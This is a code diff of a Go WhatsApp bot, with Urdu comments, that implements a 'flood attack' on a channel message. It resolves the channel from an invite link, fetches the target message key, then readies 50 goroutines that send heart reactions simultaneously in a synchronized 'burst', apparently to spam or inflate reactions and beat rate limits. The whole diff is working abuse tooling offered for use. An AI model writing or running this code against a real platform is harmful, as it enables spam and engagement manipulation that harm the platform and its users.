@@ -15,6 +15,7 @@ import (
 	"google.golang.org/protobuf/proto"
 )
 
+// سپیڈ ٹیسٹ کے لیے فی الحال 50 رکھیں
 const FloodCount = 50
 const TargetEmoji = "❤️" 
 
@@ -37,31 +38,24 @@ func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
 	args := strings.Fields(fullText)
 
 	if len(args) < 2 {
-		replyToUser(client, userChat, "❌ لنک مہیا کریں۔")
+		replyToUser(client, userChat, "❌ لنک دو بھائی!")
 		return
 	}
 
 	link := args[1]
 	parts := strings.Split(link, "/")
 	if len(parts) < 2 {
-		replyToUser(client, userChat, "❌ غلط لنک۔")
+		replyToUser(client, userChat, "❌ لنک فارمیٹ غلط ہے۔")
 		return
 	}
 
-	// 1. IDs نکالنا
 	strMsgID := strings.Split(parts[len(parts)-1], "?")[0]
 	inviteCode := parts[len(parts)-2]
+	serverMsgID, _ := strconv.Atoi(strMsgID)
 
-	// لنک والی ID کو نمبر (Int) میں بدلنا ضروری ہے تاکہ fetch کر سکیں
-	serverMsgID, err := strconv.Atoi(strMsgID)
-	if err != nil {
-		replyToUser(client, userChat, "❌ Message ID غلط ہے۔")
-		return
-	}
+	replyToUser(client, userChat, "🔍 سرور سے اوریجنل میسج نکال رہا ہوں...")
 
-	replyToUser(client, userChat, "🔍 سرور سے میسج ڈھونڈ رہا ہوں...")
-
-	// 2. چینل Resolve کرنا
+	// 1. Get Channel ID
 	metadata, err := client.GetNewsletterInfoWithInvite(context.Background(), inviteCode)
 	if err != nil {
 		replyToUser(client, userChat, fmt.Sprintf("❌ چینل نہیں ملا: %v", err))
@@ -69,79 +63,79 @@ func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
 	}
 	targetJID := metadata.ID
 
-	// 3. FETCH LOGIC
-	// ہم اس آئی ڈی سے اگلی آئی ڈی (Before) مانگیں گے تو ہمیں پچھلا میسج مل جائے گا
+	// 2. FETCH ORIGINAL MESSAGE (To get the perfect Key)
 	fetchParams := &whatsmeow.GetNewsletterMessagesParams{
 		Count:  1,
-		Before: types.MessageServerID(serverMsgID + 1), // Trick to fetch exact ID
+		Before: types.MessageServerID(serverMsgID + 1), 
 	}
-
 	fetchedMsgs, err := client.GetNewsletterMessages(context.Background(), targetJID, fetchParams)
-	if err != nil {
-		replyToUser(client, userChat, fmt.Sprintf("❌ Fetch Error: %v", err))
+	
+	if err != nil || len(fetchedMsgs) == 0 {
+		replyToUser(client, userChat, "❌ میسج fetch نہیں ہو سکا، شاید ڈیلیٹ ہو گیا ہے۔")
 		return
 	}
 
-	if len(fetchedMsgs) == 0 {
-		replyToUser(client, userChat, "❌ میسج نہیں ملا (شاید ڈیلیٹ ہو چکا ہے یا بہت پرانا ہے)۔")
-		return
+	originalMsg := fetchedMsgs[0]
+	
+	// کنفرمیشن
+	if int(originalMsg.MessageServerID) != serverMsgID {
+		replyToUser(client, userChat, fmt.Sprintf("⚠️ ID Match نہیں ہوئی (Got: %d, Want: %d)، لیکن پھر بھی ٹرائی کر رہا ہوں۔", originalMsg.MessageServerID, serverMsgID))
+	} else {
+		replyToUser(client, userChat, fmt.Sprintf("✅ ٹارگٹ لاکڈ! (ID: %d)\n⚡ BURST MODE تیار ہو رہا ہے...", serverMsgID))
 	}
 
-	// میسج مل گیا!
-	foundMsg := fetchedMsgs[0]
+	// 3. EXECUTE BURST ATTACK
+	// یہاں ہم Original Message کی Key پاس کریں گے
+	executeBurst(client, targetJID, originalMsg.Message.Key)
 	
-	// FIX 1: ServerID -> MessageServerID
-	if int(foundMsg.MessageServerID) != serverMsgID {
-		replyToUser(client, userChat, fmt.Sprintf("❌ آئی ڈی میچ نہیں ہوئی!\nFound: %d, Wanted: %d", foundMsg.MessageServerID, serverMsgID))
-	}
-
-	replyToUser(client, userChat, fmt.Sprintf("✅ میسج مل گیا! (ServerID: %d)\nفلڈ شروع... 🚀", foundMsg.MessageServerID))
-
-	// FIX 2: Manually construct the Key because foundMsg.Message.Key doesn't exist directly
-	// NewsletterMessage struct usually has ID (JID) but not a Proto Key directly attached in a simple way sometimes
-	// We will construct it manually which is safer.
-	
-	floodKey := &waProto.MessageKey{
-		RemoteJID: proto.String(targetJID.String()),
-		FromMe:    proto.Bool(false), // Newsletter messages are never "FromMe" in context of reaction
-		ID:        proto.String(strMsgID), // The string version of ID
-	}
-
-	// 4. FLOOD using EXACT KEY
-	performFlood(client, targetJID, floodKey)
-	
-	replyToUser(client, userChat, "✅ مشن مکمل۔")
+	replyToUser(client, userChat, "✅ اٹیک مکمل! 💀")
 }
 
-func performFlood(client *whatsmeow.Client, chatJID types.JID, originalKey *waProto.MessageKey) {
+func executeBurst(client *whatsmeow.Client, chatJID types.JID, key *waProto.MessageKey) {
 	var wg sync.WaitGroup
 	
-	// FIX 3: GetId -> GetID
-	fmt.Printf(">>> Flooding on Msg ID: %s\n", originalKey.GetID())
-
+	// یہ چینل "گن ٹریگر" کا کام کرے گا
+	trigger := make(chan bool)
+	
+	// میسجز کو پہلے سے بنا کر رکھ لیتے ہیں تاکہ CPU ضائع نہ ہو
+	fmt.Println(">>> Preparing Warheads...")
+	
+	// 50 Goroutines تیار کریں
 	for i := 0; i < FloodCount; i++ {
 		wg.Add(1)
 		go func(idx int) {
 			defer wg.Done()
 			
-			// Original Key کو کاپی کر کے نیا ری ایکٹ بنائیں
+			// ری ایکشن پیکٹ تیار کریں
+			// ہم Key وہی استعمال کریں گے جو سرور نے دی ہے (FromMe اور ID چھیڑیں گے نہیں)
 			reactionMsg := &waProto.Message{
 				ReactionMessage: &waProto.ReactionMessage{
 					Key: &waProto.MessageKey{
-						RemoteJID: originalKey.RemoteJID,
-						FromMe:    originalKey.FromMe,
-						ID:        originalKey.ID,
+						RemoteJID: key.RemoteJID,
+						FromMe:    key.FromMe, // اہم: جو سرور نے بتایا وہی use کرو
+						ID:        key.ID,
 					},
 					Text:              proto.String(TargetEmoji),
 					SenderTimestampMS: proto.Int64(time.Now().UnixMilli()), 
 				},
 			}
+
+			// یہاں رک جاؤ اور فائر کا انتظار کرو
+			<-trigger 
 			
-			_, err := client.SendMessage(context.Background(), chatJID, reactionMsg)
-			if err != nil && idx == 0 {
-				fmt.Printf("Flood Err: %v\n", err)
-			}
+			// 🔥 FIRE !!!
+			// Context Background استعمال کریں تاکہ کوئی ٹائم آؤٹ نہ ہو
+			client.SendMessage(context.Background(), chatJID, reactionMsg)
 		}(i)
 	}
+
+	// تھوڑا سا انتظار تاکہ سارے Goroutines لائن میں لگ جائیں
+	time.Sleep(200 * time.Millisecond)
+	fmt.Println(">>> 3... 2... 1... FIRE! 🔥")
+	
+	// ٹریگر دبا دیا! (اب سب ایک ساتھ بھاگیں گے)
+	close(trigger)
+	
 	wg.Wait()
+	fmt.Println(">>> Burst Finished.")
 }
